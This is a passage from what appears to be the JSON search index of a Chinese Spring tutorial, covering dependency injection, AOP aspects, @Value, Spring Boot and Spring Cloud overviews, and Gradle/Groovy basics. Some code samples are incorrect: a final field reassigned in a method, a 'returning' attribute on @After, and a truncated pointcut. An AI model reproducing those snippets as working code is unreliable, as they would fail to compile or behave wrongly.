\u65b9\u6cd5\u521b\u5efa\u7684\u3002 \u5982\u679c\u8981\u7528\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u6cd5\u83b7\u5f97\u6ce8\u5165\u7684\u5bf9\u8c61\uff0c\u4f7f\u7528 Spring Application Context\u3002 public class SomeClass { public void someFunc() { ApplicationContext context = new AnnotationConfigApplicationContext(MyConfig.class); MyService myService = context.getBean(MyService.class); } } Application Context \u5305\u542b\u4e86\u6240\u6709\u7684 Bean \u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7 getBean \u65b9\u6cd5\u83b7\u5f97\u3002\u4e0a\u9762\u4e00\u79cd\u4f7f\u7528\u7684\u662f\u57fa\u4e8e Annotation\uff0c\u5373 Configuration \u6ce8\u89e3\u7c7b\u83b7\u5f97 Context \u5bf9\u8c61\uff0c\u7136\u540e\u57fa\u4e8e\u7c7b\u5bf9\u8c61\u53cd\u5c04\u83b7\u5f97 Bean \u5bf9\u8c61\u3002 Spring \u4e5f\u652f\u6301 XML \u914d\u7f6e\uff0c\u5373\u5728 XML \u6587\u4ef6\u4e2d\u914d\u7f6e Bean \u5bf9\u8c61\uff0c\u7136\u540e\u901a\u8fc7 XML \u6587\u4ef6\u83b7\u5f97 Context \u5bf9\u8c61\uff0c\u4e0d\u8fc7\u8fd9\u79cd\u65b9\u6cd5\u5df2\u7ecf\u4e0d\u5e38\u7528\u4e86\u3002 <beans> <bean id=\"myService\" class=\"com.example.MyService\"/> </beans> public class SomeClass { public void someFunc() { ApplicationContext context = new ClassPathXmlApplicationContext(\"my-config.xml\"); MyService myService = context.getBean(MyService.class); } } \u8fd9\u91cc\u4e5f\u53ef\u4ee5\u4e0d\u57fa\u4e8e\u7c7b\u5bf9\u8c61\u83b7\u5f97 Bean \u5bf9\u8c61\uff0c\u800c\u662f\u57fa\u4e8e Bean \u7684 ID \u83b7\u5f97\u3002 MyService myService = (MyService) context.getBean(\"myService\"); \u5f53\u7136\uff0c\u6ce8\u89e3\u91cc\u4e5f\u53ef\u4ee5\u6539\u53d8 Bean \u7684 ID\u3002 @Bean(name = \"myService\") public MyService myService() { return new MyService(); } \u9664\u4e86\u624b\u52a8\u521b\u5efa\u914d\u7f6e\u7c7b\uff0c\u8fd8\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 @Component \u6ce8\u89e3\u3002\u8fd9\u4e2a\u6ce8\u89e3\u672c\u8eab\u5e76\u4e0d\u505a\u4ec0\u4e48\uff0c\u53ea\u6709\u4e00\u4e2a value \u5c5e\u6027\u3002\u5982\u679c\u4e0d\u5199\uff0c\u9ed8\u8ba4\u7528\u7c7b\u540d\u9996\u5b57\u6bcd\u5c0f\u5199\u4f5c\u4e3a Bean \u7684 ID\u3002 @Component(\"myService\") public class MyService { } \u6211\u4eec\u5e38\u7528\u7684\u4e00\u4e9b\u6ce8\u89e3\uff0c\u5982 @RestController \uff0c @Service \uff0c @Repository \uff0c @Configuration \uff0c\u90fd\u5305\u542b\u4e86 @Component \u3002 \u4f46\u662f\uff0cSpring \u6709\u53e6\u4e00\u4e2a\u6ce8\u89e3 @ComponentScan \uff0c\u8fd9\u4e2a\u6ce8\u89e3\u4f1a\u626b\u63cf\u6307\u5b9a\u5305\u4e0b\u7684\u6240\u6709 @Component \u6ce8\u89e3\u7c7b\uff0c\u5e76\u5c06\u5176\u6ce8\u518c\u4e3a Bean \u5bf9\u8c61\u5230\u5f53\u524d\u8fd9\u4e2a\u7c7b\u4e0b\u3002\u4f8b\u5982\uff0c @ComponentScan(\"com.example\") @Configuration public class MyConfig { } Bean \u7684\u540d\u5b57\u5c31\u662f Component \u7684 value \u5c5e\u6027\u3002\u4e4b\u540e\u5c31\u540c\u4e4b\u524d\u4e00\u6837\u83b7\u5f97\u4e0a\u4e0b\u6587\u548c\u5bf9\u8c61\u5373\u53ef\u3002 \u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u6bcf\u4e2a Spring \u542f\u52a8\u7684 run \u65b9\u6cd5\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a Application Context\uff0c\u8fd9\u4e2a Context \u5305\u542b\u4e86\u6240\u6709\u7684 Bean \u5bf9\u8c61\u3002 @SpringBootApplication public class DemoApplication { public static void main(String[] args) { ApplicationContext context = SpringApplication.run(DemoApplication.class, args); } } \u524d\u9762\u6211\u4eec\u8bf4\u8fc7\uff0ccontext \u9700\u8981\u57fa\u4e8e Config \u7c7b\u521b\u5efa\uff0c\u90a3\u8fd9\u91cc\u7684 Context \u7684 Config \u5728\u54ea\u91cc\uff1f\u5982\u679c\u4f60\u53bb\u67e5\u770b @SpringBootApplication \u7684\u6e90\u7801\uff0c\u4f60\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u6ce8\u89e3\u662f\u8fd9\u6837\u7684\uff0c @Target(ElementType.TYPE) @Retention(RetentionPolicy.RUNTIME) @Documented @Inherited @SpringBootConfiguration @EnableAutoConfiguration @ComponentScan(excludeFilters = { @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class), @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) }) public @interface SpringBootApplication { // ... } \u662f\u7684\uff0c\u5b83\u672c\u8eab\u5c31\u6709 @ComponentScan \u6ce8\u89e3\u3002\u6b64\u5916\uff0c\u5982\u679c\u518d\u53bb\u770b @SpringBootConfiguration \uff0c\u4f60\u4f1a\u53d1\u73b0\u5b83\u5305\u542b\u4e86 @Configuration \u6ce8\u89e3\u3002\u6240\u4ee5\uff0c @SpringBootApplication \u5305\u542b\u4e86 @Configuration \u548c @ComponentScan \u3002 \u5f53\u7136\uff0c\u6bd4\u8d77\u8fd9\u79cd\u4f20\u7edf\u7684\u521b\u5efa Bean \u7684\u65b9\u6cd5\uff0c\u4f60\u5e94\u8be5\u66f4\u719f\u6089 @Resource \u3001 @Autowired \u3001 @Qualifier \u3001 @Inject \u7b49\u6ce8\u89e3\u3002\u8fd9\u4e9b\u6ce8\u89e3\u662f Spring \u7684\u4f9d\u8d56\u6ce8\u5165\u7684\u6838\u5fc3\u3002 @Inject \u548c @Autowired \u662f\u7b49\u4ef7\u7684\uff0c\u662f\u4f9d\u8d56\u7c7b\u578b\u6ce8\u5165\uff0c\u5206\u522b\u7531 Java \u548c Spring \u63d0\u4f9b\u3002 @Resource \u548c @Qualifier \u662f\u4f9d\u8d56\u540d\u79f0\u6ce8\u5165\uff0c\u5206\u522b\u7531 Java \u548c Spring \u63d0\u4f9b\u3002\u4e00\u822c\u63a8\u8350\u4f7f\u7528 Spring \u63d0\u4f9b\u7684\u6ce8\u89e3\u3002 @Autowired \u548c @Qualifier \u7684\u7528\u6cd5\u57fa\u672c\u76f8\u540c\uff0c\u53ea\u662f\u4f9d\u8d56 ID \u548c\u7c7b\u540d\u7684\u533a\u522b\u3002 @Component public class SomeClass { } public class AnotherClass { @Autowired private final SomeClass someClass; public void someFunc(@Autowired @Qualifier(\"someClass\") SomeClass someClass) { this.someClass = someClass; } } \u6839\u636e Spring \u7684 \u5b98\u65b9\u6587\u6863 \uff0c\u8fd8\u6709 setter \u6ce8\u5165\u6cd5\u7b49\u7b49\u3002\u4f46\u662f\uff0c\u6700\u63a8\u8350\u7684\u65b9\u6cd5\u662f\u4f7f\u7528\u6784\u5efa\u5668\u6ce8\u5165\u52a0\u4e0d\u53ef\u53d8\u79c1\u6709\u5b57\u6bb5\u3002\u5373\u4e0b\u9762\u8fd9\u79cd\u65b9\u6cd5\u3002 @Component public class SomeClass { } public class AnotherClass { private final SomeClass someClass; @Autowired public AnotherClass(SomeClass someClass) { this.someClass = someClass; } } \u6216\uff0c public class AnotherClass { private final SomeClass someClass; public AnotherClass(@Autowired SomeClass someClass) { this.someClass = someClass; } } \u6216\u8005\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 lombok \u7684 @RequiredArgsConstructor \u6ce8\u89e3\u3002 @RequiredArgsConstructor public class AnotherClass { private final SomeClass someClass; }","title":"\u4f9d\u8d56\u6ce8\u5165"},{"location":"01/#aop-aspect-oriented-programming","text":"AOP \u5373 Aspect-Oriented Programming\uff0c\u9762\u5411\u5207\u9762\u7f16\u7a0b\u3002\u8fd9\u53ea\u662f\u8bbe\u8ba1\u6a21\u5f0f\u4e2d \u6a21\u7248\u65b9\u6cd5\u6a21\u5f0f \u7684\u4e00\u79cd\u5b9e\u73b0\uff0c\u5373\u5728\u65b9\u6cd5\u6267\u884c\u524d\u540e\u63d2\u5165\u4e00\u4e9b\u4ee3\u7801\u3002 Spring \u7684 AOP \u662f\u57fa\u4e8e\u4ee3\u7406\u7684\uff0c\u5373\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u4ee3\u7406\u5bf9\u8c61\u7684\u65b9\u6cd5\u4e2d\u63d2\u5165\u4e00\u4e9b\u4ee3\u7801\u3002 \u5177\u4f53\u800c\u8a00\uff0c\u5982\u679c\u8981\u4e3a\u67d0\u4e2a\u7c7b\u7684\u67d0\u4e2a\u65b9\u6cd5\u6dfb\u52a0\u5207\u9762\uff0c\u5373\u5728\u4e0d\u6539\u53d8\u539f\u6709\u65b9\u6cd5\u7684\u60c5\u51b5\u4e0b\u6dfb\u52a0\u4e00\u4e9b\u4ee3\u7801\uff0c\u53ef\u4ee5\u4f7f\u7528 @Aspect \u6ce8\u89e3\u3002 @Aspect @Component public class MyAspect { @Before(\"com.example.MyService.s\") public void before() { System.out.println(\"Before\"); } @After(\"execution(* com.example.MyService.*(..))\", returning = \"retVal\") public void after(Object retVal) { System.out.println(\"After: \" + retVal); } } \u6ce8\u610f\uff0c\u5207\u9762\u7c7b\u53ea\u662f\u521b\u5efa\u4e86\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u800c\u4e0d\u662f\u66f4\u6539\u4e86\u539f\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002\u5982\u679c\u76f4\u63a5\u4f7f\u7528\u539f\u7c7b\u6765\u521b\u5efa\u5bf9\u8c61\uff0c\u5207\u9762\u662f\u4e0d\u4f1a\u751f\u6548\u7684\u3002 @After \u548c @Before \u91cc\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5207\u5165\u70b9\u8868\u8fbe\u5f0f\uff0c\u5373\u8981\u5207\u5165\u7684\u65b9\u6cd5\u3002 execution( com.example.service. .*(..))\uff1a\u5339\u914dcom.example.service\u5305\u4e0b\u6240\u6709\u7c7b\u7684\u6240\u6709\u65b9\u6cd5\u3002 within(com.example.service..*)\uff1a\u5339\u914dcom.example.service\u5305\u53ca\u5176\u5b50\u5305\u4e0b\u7684\u6240\u6709\u7c7b\u7684\u6240\u6709\u65b9\u6cd5\u3002 bean(myBean)\uff1a\u5339\u914d\u540d\u4e3amyBean\u7684bean\u7684\u6240\u6709\u65b9\u6cd5\u3002 @annotation(org.springframework.transaction.annotation.Transactional)\uff1a\u5339\u914d\u6240\u6709\u5e26\u6709@Transactional\u6ce8\u89e3\u7684\u65b9\u6cd5\u3002 After \u7684 returning \u5c5e\u6027\u662f\u8fd4\u56de\u503c\uff0c\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u8fd4\u56de\u503c\u3002 \u8fd9\u6837\u5b50\u521b\u5efa\u5207\u9762\u7c7b\u540e\uff0cSpring \u4f1a\u5728\u8fd0\u884c\u65f6\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u4ee3\u7406\u5bf9\u8c61\u7684\u65b9\u6cd5\u4e2d\u63d2\u5165\u4e00\u4e9b\u4ee3\u7801\u3002 \u8981\u4f7f\u7528\u8fd9\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u9700\u8981\u5728 @SpringBootApplication \u7c7b\u4e2d\u6dfb\u52a0 @EnableAspectJAutoProxy \u6ce8\u89e3\u3002 @SpringBootApplication @EnableAspectJAutoProxy public class DemoApplication { public static void main(String[] args) { ApplicationContext context = SpringApplication.run(DemoApplication.class, args); } } \u8fd9\u6837\uff0c\u4f7f\u7528 @Autowired \u6ce8\u5165\u7684\u5bf9\u8c61\u5c31\u662f\u4ee3\u7406\u5bf9\u8c61\u4e86\u3002 \u7531\u4e8e AOP \u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\u7528\u7684\u4e0d\u591a\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u5c55\u5f00\u8bb2\u89e3\u4e86\u3002","title":"AOP (Aspect-Oriented Programming)"},{"location":"01/#value","text":"\u867d\u7136 @Value \u6ce8\u89e3\u5e76\u4e0d\u80fd\u7b97\u662f Spring \u7684\u6838\u5fc3\u529f\u80fd\uff0c\u4f46\u662f\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\u7528\u7684\u5f88\u591a\uff0c\u56e0\u6b64\u8fd9\u91cc\u4e5f\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\u3002 @Value \u6ce8\u89e3\u53ef\u4ee5\u7528\u6765\u6ce8\u5165\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u5c5e\u6027\u3002 @Component public class MyService { @Value(\"${my.property}\") private String property; } \u8fd9\u6837\uff0cSpring \u4f1a\u5728\u542f\u52a8\u65f6\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684 my.property \u5c5e\u6027\uff0c\u5e76\u5c06\u5176\u6ce8\u5165\u5230 property \u5b57\u6bb5\u4e2d\u3002\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u5c31\u662f application.yml \uff0c\u6216 bootstrap.yml \uff08\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u662f\u5176\u4ed6\u683c\u5f0f\u7684\u6587\u4ef6\uff09\u3002\u540e\u8005\u662f\u5728\u4e4b\u540e\u7684 Spring Cloud \u4e2d\u7528\u5230\u7684\u3002\u5982\u679c\u914d\u7f6e\u6587\u4ef6\u6ca1\u6709\uff0c\u8fd8\u4f1a\u627e\u73af\u5883\u53d8\u91cf\uff0c\u73af\u5883\u53d8\u91cf\u4e2d\uff0c\u70b9\u53f7\u4f1a\u88ab\u9ed8\u8ba4\u66ff\u6362\u4e3a\u4e0b\u5212\u7ebf\u3002 my: property: value \u7b49\u4ef7\u4e8e\u6709\u4e00\u4e2a\u73af\u5883\u53d8\u91cf MY_PROPERTY \uff0c\u503c\u4e3a value \u3002 \u4f46\u662f\uff0c\u8fd9\u6837\u5b50\u53ea\u80fd\u6ce8\u5165\u5b57\u7b26\u4e32\u3002\u5982\u679c\u8981\u6ce8\u5165\u5176\u5b83\u7c7b\u578b\uff0c\u4f8b\u5982\u4e00\u4e2a\u6574\u6570\uff0c\u9700\u8981\u4f7f\u7528 Spring \u503c\u8868\u8fbe\u5f0f\uff0c\u5373 #{} \u3002 @Component public class MyService { @Value(\"#{${my.property} + 1}\") private int property; } \u8fd9\u4e2a\u542b\u4e49\u662f\uff0c\u5c06 my.property \u7684\u503c\u52a0\u4e00\u540e\u6ce8\u5165\u5230 property \u5b57\u6bb5\u4e2d\u3002","title":"Value \u6ce8\u89e3"},{"location":"01/#spring-boot","text":"Spring Boot \u4e0d\u662f Spring \u7684\u67d0\u4e2a\u6a21\u5757\u3002\u800c\u662f Spring \u7684\u67d0\u4e2a\u6a21\u5757\u52a0\u4e0a\u4e00\u4e9b\u9ed8\u8ba4\u914d\u7f6e\u3002\u4ee5 Spring Data JPA \u4e3e\u4f8b\uff0c\u5b83\u7684\u6838\u5fc3\u529f\u80fd\u5728 org.springframework.data:spring-data-jpa \uff0c\u5373 \u8fd9\u4e2a maven repository \uff0c\u800c Spring Boot Starter Data JPA \u662f Spring Data JPA \u52a0\u4e0a\u4e00\u4e9b\u9ed8\u8ba4\u914d\u7f6e\uff0c\u5b83\u5728 org.springframework.boot:spring-boot-starter-data-jpa \uff0c\u5373 \u8fd9\u4e2a maven repository \u3002 \u53ef\u4ee5\u8fd9\u6837\u6253\u6bd4\u65b9\uff0cSpring Framework \u662f\u94a2\u7b4b\u6df7\u6ce5\u571f\u6846\u67b6\uff0c\u5176\u4e2d\u7684\u5185\u9970\u3001\u5bb6\u5177\u3001\u7535\u5668\u7b49\u7b49\u90fd\u662f Spring \u7684\u5404\u79cd\u6a21\u5757\uff0c\u4f8b\u5982 Spring Web\u3001Spring Data\u3001Spring Security \u7b49\u7b49\u3002\u6bcf\u4e2a\u6a21\u5757\u7684 Spring Boot Starter \u5305\u5373\u662f\u5305\u542b\u4e86\u88c5\u4fee\u670d\u52a1\u7684\u5185\u9970\u3001\u5bb6\u5177\u3001\u7535\u5668\u7b49\u7b49\u3002\u5982\u679c\u5b89\u88c5\u5b8c\u4f60\u89c9\u5f97\u4e0d\u6ee1\u610f\uff0c\u4f60\u53ef\u4ee5\u81ea\u5df1\u518d\u505a\u5c0f\u6539\u52a8\uff0c\u800c\u4e0d\u5fc5\u4ece\u5934\u81ea\u5df1\u5b8c\u6210\u6240\u6709\u7684\u88c5\u4fee\u5de5\u4f5c\u3002 \u5177\u4f53\u5230\u7f16\u7a0b\u4e0a\uff0cSpring Boot Starter \u7248\u7684\u5de5\u5177\u9664\u4e86\u539f\u672c\u7684\u6846\u67b6\u5916\uff0c\u8fd8\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u9ed8\u8ba4\u7684 Config \u7c7b\uff0c\u5982\u679c\u9700\u8981\u81ea\u5b9a\u4e49\uff0c\u53ea\u9700\u8981\u521b\u5efa\u4e00\u4e2a Config \u7c7b\uff0c\u7136\u540e\u5728\u5176\u4e2d\u6dfb\u52a0 @Bean \u6ce8\u89e3\uff0c\u8986\u76d6\u6389\u9ed8\u8ba4\u7684 Bean \u5bf9\u8c61\u5373\u53ef\u3002 Spring Boot \u914d\u7f6e\u7684\u4f18\u5148\u7ea7\u987a\u5e8f\u662f\uff0c \u547d\u4ee4\u884c\u53c2\u6570 application.properties\u6216application.yml\uff08\u5728config\u5b50\u76ee\u5f55\u6216\u5f53\u524d\u76ee\u5f55\uff09 application.properties\u6216application.yml\uff08\u5728\u7c7b\u8def\u5f84\u7684\u6839\u76ee\u5f55\uff09 \u901a\u8fc7@PropertySource\u6ce8\u89e3\u52a0\u8f7d\u7684\u5c5e\u6027\u6587\u4ef6 \u9ed8\u8ba4\u5c5e\u6027\uff08\u901a\u8fc7SpringApplication.setDefaultProperties\u6307\u5b9a\uff09 Spring Framework \u81ea\u5df1\u4e5f\u6709\u8bb8\u591a\u7684\u914d\u7f6e\uff0c\u4f8b\u5982\u6211\u4eec\u4e0a\u9762\u8bb2\u7684 @Configuration \u3001 @Bean \u7b49\u7b49\uff0c\u56e0\u6b64\u5b83\u4e5f\u6709\u81ea\u5df1\u7684 Spring Boot Starter\uff0c\u5373 org.springframework.boot:spring-boot-starter \u3002 \u6ce8\u610f\uff0c\u6240\u6709\u7684 Spring Boot \u90fd\u5fc5\u987b\u7edf\u4e00\u4e00\u4e2a\u7248\u672c\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u5404\u79cd\u95ee\u9898\u3002\u5b83\u4eec\u7684\u7248\u672c\u53f7\u603b\u662f\u4fdd\u6301\u4e00\u81f4\u7684\u3002","title":"Spring Boot \u7b80\u4ecb"},{"location":"01/#spring-cloud","text":"Spring Cloud \u4e0e\u5176\u8bf4\u662f\u4e00\u4e2a\u7edf\u4e00\u7684\u6846\u67b6\uff0c\u4e0d\u5982\u8bf4\u662f\u4e00\u7cfb\u5217\u5de5\u5177\u7684\u96c6\u5408\u3002\u8fd9\u4e9b\u5de5\u5177\u90fd\u662f\u4e3a\u4e86\u89e3\u51b3\u5fae\u670d\u52a1\u67b6\u6784\u4e2d\u7684\u4e00\u4e9b\u95ee\u9898\u800c\u8bbe\u8ba1\u7684\u3002 \u8fd9\u4e00\u7cfb\u5217\u5de5\u5177\u4e2d\uff0c\u6709\u4e00\u4e9b\u7c7b\u4f3c\u4e8e\u7f16\u7a0b\u4e2d\u7684\u63a5\u53e3\uff0c\u6709\u4e00\u4e9b\u7c7b\u4f3c\u4e8e\u8fd9\u4e9b\u63a5\u53e3\u7684\u5b9e\u73b0\u3002\u4f8b\u5982\uff0cSpring Cloud Circuit Breaker \u662f\u7c7b\u4f3c\u4e8e\u63a5\u53e3\uff0c\u5b83\u6709\u5b9e\u73b0 Resilience4j \u548c Hystrix\u3002\u5f53\u7136\uff0c\u6709\u4e00\u4e9b\u5de5\u5177\u662f\u6ca1\u6709\u7edf\u4e00\u7684\u63a5\u53e3\u7684\uff0c\u4f8b\u5982\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\uff0cConsul\uff0cNacos\uff0cEureka \u662f\u4e09\u4e2a\u5b9e\u73b0\uff0c\u4f46\u4ed6\u4eec\u4e0d\u9075\u5faa\u7edf\u4e00\u7684\u63a5\u53e3\u3002 \u5f53\u6211\u4eec\u8bf4 Spring Cloud \u65f6\uff0c\u8fd9\u4e5f\u662f\u4e00\u4e2a\u7c7b\u4f3c\u4e0e\u63a5\u53e3\u7684\u4e1c\u897f\uff0c\u5b83\u4e5f\u6709\u5b9e\u73b0\uff0c\u4f8b\u5982 Spring Cloud Netflix\uff0cSpring Cloud Alibaba \u7b49\u7b49\uff0c\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u81ea\u5df1\u9009\u62e9\u4e00\u4e9b\u5de5\u5177\u6765\u7ec4\u5408\uff0c\u5b8c\u6210 Spring Cloud \u7684\u529f\u80fd\u3002","title":"Spring Cloud \u7b80\u4ecb"},{"location":"02/","text":"Spring \u901f\u6210 Ch2 \u56de\u5230 Java \u7b80\u4ecb \u7b2c\u4e8c\u7ae0\u4e86\uff0c\u4f46\u6211\u4eec\u8fd8\u662f\u4e0d\u8bb2 Spring Cloud\uff0c\u800c\u662f\u8981\u56de\u5230 Java \u57fa\u7840\u3002\u5177\u4f53\u800c\u8a00\uff0c\u662f Java \u5de5\u7a0b\u7684\u7f16\u8bd1\u548c\u6784\u5efa\uff0c\u56e0\u4e3a Spring Cloud \u9700\u8981\u624b\u52a8\u914d\u7f6e\u591a\u9879\u76ee\u548c\u5b50\u9879\u76ee\u5d4c\u5957\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e86\u89e3 Java \u5de5\u7a0b\u7684\u6784\u5efa\u3002 \u8fd9\u91cc\u6211\u4eec\u8bb2\u4f7f\u7528 gradle\uff0c\u4f46\u662f\u5927\u5bb6\u90fd\u77e5\u9053\uff0c\u4e8b\u5b9e\u4e0a\u5e38\u7528\u7684\u662f maven\u3002\u4e0d\u8981\u62c5\u5fc3\uff0c\u56e0\u4e3a\u4e4b\u540e\u6211\u4eec\u4f1a\u8bb2\u5230\uff0cgradle \u548c maven \u7684\u914d\u7f6e\u662f\u5b8c\u5168\u4e00\u81f4\u7684\uff0c\u53ea\u662f\u4e00\u4e2a\u662f\u7528 dsl\uff0c\u4f8b\u5982 groovy\uff0c\u4e00\u4e2a\u662f\u7528 xml\u3002 \u6b64\u5916\u6211\u4eec\u8fd8\u5c06\u8bb2\u4e00\u4e2a\u504f\u95e8\u7684\u8bdd\u9898\uff0c@NonNull \u6ce8\u89e3\uff0c\u8fd9\u4e2a\u6ce8\u89e3\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5728\u7f16\u8bd1\u65f6\u68c0\u67e5\u7a7a\u6307\u9488\u5f02\u5e38\u3002 Java \u7f16\u8bd1 \u590d\u4e60\u4e00\u4e0b\uff0cJava \u7f16\u8bd1\u7684\u547d\u4ee4\u662f\uff1a javac -d out src/main/java/com/example/Hello.java javac \u4f1a\u8f93\u51fa\u7f16\u8bd1\u597d\u7684 class \u6587\u4ef6\u5230 out \u76ee\u5f55\u3002\u5982\u679c\u8981\u8fd0\u884c\u8fd9\u4e2a class \u6587\u4ef6\uff0c\u53ef\u4ee5\u4f7f\u7528 java \u547d\u4ee4\uff1a java -cp out com.example.Hello \u4f46\u662f\uff0c\u5982\u679c\u6709\u591a\u4e2a class \u6587\u4ef6\uff0c\u5c31\u9700\u8981\u624b\u52a8\u6307\u5b9a classpath\uff0c\u8fd9\u6837\u5f88\u9ebb\u70e6\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4e00\u4e2a\u5de5\u5177\u6765\u5e2e\u52a9\u6211\u4eec\u7ba1\u7406\u4f9d\u8d56\u3002 Java \u9879\u76ee\u7ba1\u7406\u5de5\u5177 Java \u9879\u76ee\u7ba1\u7406\u5de5\u5177\u4e8b\u5b9e\u4e0a\u53ea\u6709 gradle \u548c maven \u6709\u4eba\u7528\uff0c\u5176\u4ed6\u7684\u90fd\u662f\u5c0f\u4f17\uff0c\u4f8b\u5982 sbt\uff08\u6211\u4e2a\u4eba\u6bd4\u8f83\u559c\u6b22 scala\uff09\u3002 Maven \u548c Gradle \u90fd\u662f\u57fa\u4e8e\u9879\u76ee\u7684\uff0c\u5373\u9879\u76ee\u662f\u4e00\u4e2a\u6574\u4f53\uff0c\u6709\u4e00\u4e2a pom.xml \u6216 build.gradle \u6587\u4ef6\u6765\u63cf\u8ff0\u9879\u76ee\u7684\u4f9d\u8d56\u548c\u6784\u5efa\u65b9\u5f0f\u3002\u4e24\u8005\u5728\u672c\u8d28\u4e0a\u90fd\u662f\u5b9a\u4e49\u4e86\u4e00\u4e2a project object model\uff0c\u5373\u9879\u76ee\u5bf9\u8c61\u6a21\u578b\uff0c\u800c\u4e14\u4e24\u8005\u5b9a\u4e49\u7684\u6a21\u578b\u662f\u4e00\u6837\u7684\uff0c\u53ea\u662f\u8868\u73b0\u5f62\u5f0f\u4e0d\u540c\uff0c\u4e0b\u9762\u6211\u4eec\u4f1a\u770b\u5230\u3002 Groovy \u8bed\u8a00 Gradle \u4f7f\u7528 groovy \u8bed\u8a00\u6765\u5b9a\u4e49\u9879\u76ee\uff0cgroovy \u662f\u4e00\u79cd JVM \u8bed\u8a00\uff0c\u548c Java \u4e00\u6837\uff0c\u4f46\u662f\u8bed\u6cd5\u66f4\u7b80\u6d01\uff0c\u66f4\u9002\u5408 DSL\u3002 \u867d\u7136\u542c\u8d77\u6765\uff0c\u4e3a\u4e86\u4f7f\u7528 java \u7684\u5305\u7ba1\u7406\u5de5\u5177\uff0c\u53bb\u5b66\u4e00\u95e8\u7f16\u7a0b\u8bed\u8a00\u662f\u4e2a\uff0c\u5f88\u6709\u9b44\u529b\u7684\u51b3\u5b9a\u3002\u4f46\u6211\u4eec\u53ea\u9700\u8981\u5b66\u4e60\u56db\u4e2a\u65b9\u9762\uff1a\u53d8\u91cf\uff0c\u95ed\u5305\uff0c\u51fd\u6570\u8c03\u7528\uff0c\u5b57\u7b26\u4e32\u63d2\u503c\u3002 \u53d8\u91cf Groovy \u662f\u52a8\u6001\u7c7b\u578b\uff0c\u4f7f\u7528 def \u5173\u952e\u5b57\u5b9a\u4e49\u53d8\u91cf\u3002\u4f8b\u5982\uff1a def name = 'world' \u5f88\u7b80\u5355\uff0c\u4e4b\u540e\u91cd\u65b0\u8d4b\u503c\u5373\uff0c name = 'Groovy' \u95ed\u5305 Groovy \u4e2d\uff0c\u95ed\u5305\u662f\u4e00\u79cd\u533f\u540d\u51fd\u6570\uff0c\u53ef\u4ee5\u76f4\u63a5\u8d4b\u503c\u7ed9\u53d8\u91cf\uff0c\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u3002\u4f8b\u5982\uff1a def myClosure = { println 'Hello, world!' } \u5f53\u7136\uff0c\u4f5c\u4e3a dsl \u65f6\uff0c\u4e00\u822c\u4f1a\u7701\u6389 def \u5173\u952e\u5b57\uff0c\u76f4\u63a5\u5199\u95ed\u5305\u3002\u4f8b\u5982\uff1a plugins { id 'java' id \"org.springframework.boot\" version \"3.2.6\" id 'io.spring.dependency-management' version '1.1.5' } \u8fd9\u6837\u5c31\u5b9a\u4e49\u4e86\u4e00\u4e2a\u95ed\u5305\uff0c\u5927\u62ec\u53f7\u5305\u88f9\u4e86\u4e00\u6bb5\u4ee3\u7801\u3002 \u95ed\u5305\u7684\u6700\u540e\u4e00\u884c\u4f1a\u88ab\u5f53\u6210\u8fd4\u56de\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u7701\u7565 return \u5173\u952e\u5b57\u3002\u4f8b\u5982\uff1a def myClosure = { 'Hello, world!' } \u51fd\u6570\u8c03\u7528 Groovy \u7684\u51fd\u6570\u8c03\u7528\u4e0e\u5176\u5b83\u5e38\u89c1\u8bed\u8a00\u7684\u552f\u4e00\u533a\u522b\u662f\uff0c\u53ef\u4ee5\u7701\u7565\u62ec\u53f7\u3002\u4f8b\u5982\uff1a println 'Hello, world!' \u5728\u4e0a\u9762\u7684\u4f8b\u5b50\uff0c\u5373\uff0c plugins { id 'java' id \"org.springframework.boot\" version \"3.2.6\" id 'io.spring.dependency-management' version '1.1.5' } \u91cc\u9762\u7684 id \u548c version \u90fd\u662f\u51fd\u6570\u8c03\u7528\uff0c\u4f46\u662f\u7701\u7565\u4e86\u62ec\u53f7\u3002\u8981\u628a\u5b83\u4eec\u90fd\u5199\u5168\uff0c\u5c31\u662f\uff1a plugins { id('java') id(\"org.springframework.boot\").version(\"3.2.6\") id('io.spring.dependency-management').version('1.1.5') } \u5b57\u7b26\u4e32\u63d2\u503c Groovy \u7684\u5b57\u7b26\u4e32\u63d2\u503c\u548c JS \u4e00\u6837\uff0c\u4f7f\u7528 ${} \u3002\u4f8b\u5982\uff1a def name = 'world' println \"Hello, ${name}!\" \u6ce8\u610f\uff0c\u5355\u5f15\u53f7\u521b\u5efa\u7684\u662f java.lang.String \u5bf9\u8c61\uff0c\u800c\u53cc\u5f15\u53f7\u521b\u5efa\u7684\u662f 